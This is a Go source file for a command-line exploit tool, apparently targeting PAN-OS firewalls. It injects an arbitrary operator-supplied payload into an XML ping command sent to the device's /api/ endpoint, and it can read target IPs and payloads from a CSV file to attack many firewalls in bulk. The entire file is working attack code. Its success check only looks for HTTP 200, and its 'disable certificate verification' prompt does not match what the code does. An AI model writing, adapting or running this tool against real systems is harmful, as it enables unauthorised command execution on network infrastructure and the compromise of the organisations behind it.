package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"encoding/csv"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"
)

var httpClient = &http.Client{
	Timeout: 5 * time.Second,
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{},
	},
}

func exploitFirewall(targetIP, payload, rootCA string) {
	url := fmt.Sprintf("https://%s/api/", targetIP)
	requestBody := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
	<request>
		<op cmd="test" />
		<cmd code="ping">%s</cmd>
	</request>`, payload)

	request, err := http.NewRequest("POST", url, strings.NewReader(requestBody))
	if err != nil {
		fmt.Printf("Failed to create request for %s: %v\n", targetIP, err)
		return
	}

	request.Header.Set("User-Agent", "PAN-OS-Exploit")
	request.Header.Set("Content-Type", "application/xml")

	if rootCA != "" {
		// Load the root CA certificates from the PEM file
		rootCAs := x509.NewCertPool()
		caCert, err := os.ReadFile(rootCA)
		if err != nil {
			fmt.Printf("Failed to read root CA file: %v\n", err)
			return
		}
		if !rootCAs.AppendCertsFromPEM(caCert) {
			fmt.Println("No root CAs found in PEM file")
			return
		}

		// Configure the TLS client to trust the loaded root CAs
		httpClient.Transport.(*http.Transport).TLSClientConfig.RootCAs = rootCAs
	}

	response, err := httpClient.Do(request)
	if err != nil {
		fmt.Printf("Failed to exploit %s: %v\n", targetIP, err)
		return
	}
	defer response.Body.Close()

	if response.StatusCode == http.StatusOK {
		fmt.Printf("Exploited successfully against %s!\n", targetIP)
	} else {
		fmt.Printf("Exploit failed for %s. Response: %s\n", targetIP, response.Status)
	}
}

func main() {
	reader := bufio.NewReader(os.Stdin)

	fmt.Print("Do you want to enter values directly (D) or use a CSV file (C)? ")
	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(strings.ToLower(choice))

	switch choice {
	case "d":
		for {
			fmt.Print("Enter the IP address of the vulnerable PAN-OS firewall (or 'q' to quit): ")
			targetIP, _ := reader.ReadString('\n')
			targetIP = strings.TrimSpace(targetIP)
			if targetIP == "q" {
				break
			}

			fmt.Print("Enter the path to the root CA certificate (leave blank to disable certificate verification): ")
			rootCA, _ := reader.ReadString('\n')
			rootCA = strings.TrimSpace(rootCA)

			fmt.Print("Enter the payload to execute: ")
			payload, _ := reader.ReadString('\n')
			payload = strings.TrimSpace(payload)

			exploitFirewall(targetIP, payload, rootCA)
		}
	case "c":
		fmt.Print("Enter the path to the CSV file: ")
		csvPath, _ := reader.ReadString('\n')
		csvPath = strings.TrimSpace(csvPath)

		file, err := os.Open(csvPath)
		if err != nil {
			fmt.Printf("Error opening CSV file: %v\n", err)
			return
		}
		defer file.Close()

		csvReader := csv.NewReader(file)
		records, err := csvReader.ReadAll()
		if err != nil {
			fmt.Printf("Error reading CSV records: %v\n", err)
			return
		}

		for _, record := range records {
			if len(record) != 3 {
				fmt.Println("Invalid CSV format. Each record must contain three fields.")
				return
			}
			targetIP := strings.TrimSpace(record[0])
			payload := strings.TrimSpace(record[1])
			rootCA := strings.TrimSpace(record[2])
			exploitFirewall(targetIP, payload, rootCA)
		}
	default:
		fmt.Println("Invalid choice. Please enter 'D' for entering values directly or 'C' for using a CSV file.")
	}
}
